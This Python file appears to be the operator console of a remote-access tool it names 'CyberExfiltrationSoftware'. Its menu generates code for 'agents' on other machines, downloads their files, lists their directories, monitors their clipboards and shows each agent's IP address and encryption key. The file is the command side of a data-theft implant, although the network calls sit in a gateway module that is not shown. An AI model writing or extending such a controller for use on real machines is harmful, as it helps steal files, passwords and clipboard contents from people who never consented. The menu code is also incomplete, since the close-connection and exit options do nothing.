from rich.console import Console
from rich.table import Table
from rich.theme import Theme
from rich.prompt import Prompt

import Gateways.CybServerGateway as cybServerGateway


custom_theme = Theme({
    "success": "green",
    "info": "deep_sky_blue1",
    "error": "bold red"
})
console = Console(theme=custom_theme)

options_rows = ['Generate code for agent', 'Download file from agent', 'List agent\'s files from directory',
                'Monitor agent\'s clipboard', 'List agents', 'Close agent connection', 'Exit']


def welcome_message():
    print('Welcome to the CyberExfiltrationSoftware. To check usages please type options')


def menu():
    table = Table()
    table.add_column("S. No.", style="cyan", no_wrap=True)
    table.add_column("Options", style="magenta")

    i = 1
    for option in options_rows:
        table.add_row(str(i), option)
        i = i + 1

    value = input('>')
    if value == '1':
        generate_code_for_agent()
    if value == '2':
        download_file_from_agent()
    if value == '3':
        list_agent_files()
    if value == '4':
        monitor_agent_clipboard()
    if value == '5':
        list_agents()
    if value == 'options':
        console.print(table)
    else:
        menu()


def generate_code_for_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    code = cybServerGateway.generate_first_code_for_agent(cybServerGateway.GenerateFirstCodeForAgentInputType(
        ip_address=ip_address))
    menu()


def download_file_from_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's file path", style="info")
    file_path = input('>')
    cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
        ip_address=ip_address, file_path=file_path))
    menu()


def list_agent_files():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's directory path", style="info")
    dir_path = input('>')
    cybServerGateway.list_files_from_agent(cybServerGateway.ListFilesFromAgentInputType(
        ip_address=ip_address, dir_path=dir_path))
    menu()


def monitor_agent_clipboard():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's clipboard monitor duration", style="info")
    duration = input('>')
    cybServerGateway.monitor_clipboard_on_agent(cybServerGateway.MonitorClipboardOnAgentInputType(
        ip_address=ip_address, duration=duration))
    menu()


def list_agents():
    table = Table()
    agents = cybServerGateway.list_agents()
    headers = agents[0].keys()
    for header in headers:
        table.add_column(header, style="magenta")

    for agent in agents:
        table.add_row(str(agent['id']), agent['ip_address'], str(agent['created_at']), agent['encryption_key'],
                      str(agent['status']))

    console.print(table)
    menu()
